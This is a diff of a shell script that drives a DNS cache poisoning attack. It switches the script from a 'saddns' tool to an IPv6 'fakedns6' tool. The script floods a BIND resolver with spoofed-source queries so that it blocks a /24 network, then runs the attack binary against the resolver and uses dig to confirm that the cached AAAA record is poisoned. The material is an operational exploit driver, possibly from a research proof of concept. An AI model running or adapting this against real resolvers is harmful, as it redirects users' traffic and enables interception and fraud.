@@ -10,25 +10,25 @@ sleep 10
 
 # flood
 # This is specifically for BIND. To prevent it from answering queries sent by 1.2.3.4, we spoof 1.2.3.250 to flood queries. BIND will then block all queries from the same /24 network.
-./dns_query.sh $5 `echo $1 | sed -E 's/\.[0-9]*$/\.250/g'` 789 `echo $4 | sed "s/\./ /g"` &
-cd ..
+#sh ./dns_query.sh $5 `echo $1 | sed -E 's/\.[0-9]*$/\.250/g'` 789 `echo $4 | sed "s/\./ /g"`
+bash ./dns_query.sh $5 `echo $1` 789 `echo $4 | sed "s/\./ /g"`
 
 # Start attack
 # Change the argument accordingly
-time ./saddns -a $5 -b1 $1 -i $3 -n $4 -r $1 -t 50000 -ad $2 -tg 0 -s 10000 -e 65000 -j 0
+time ./fakedns6 -a $5 -b $1 -i $3 -n $4 -r $1 -t 50000 -ad $2 -tg 0 -s 10000 -e 65000 -j 0
 
 # Attack finished
 # Kill the flooding process.
-pkill hping
+# pkill hping
 # Validations
 echo 'After attack:'
 dig @$1 $4 AAAA
 echo 'If there is no change in result, please wait for the original cache to expire. Otherwise please terminate the attack by Ctrl-C.'
-sleeptime=`dig @$1 $4 | grep -o -P '[0-9]+[ \t]*IN' | head -n 1 | sed 's/IN//g'`
+sleeptime=`dig @$1 $4 AAAA | grep -o -P '[0-9]+[ \t]*IN' | head -n 1 | sed 's/IN//g'`
 echo "Wait for $sleeptime seconds..."
 sleep $sleeptime
 echo 'Cache should be poisoned now:'
-dig @$1 $4
+dig @$1 $4 AAAA
 echo 'Wait for another 2 seconds...'
 sleep 2
-dig @$1 $4
+dig @$1 $4 AAAA
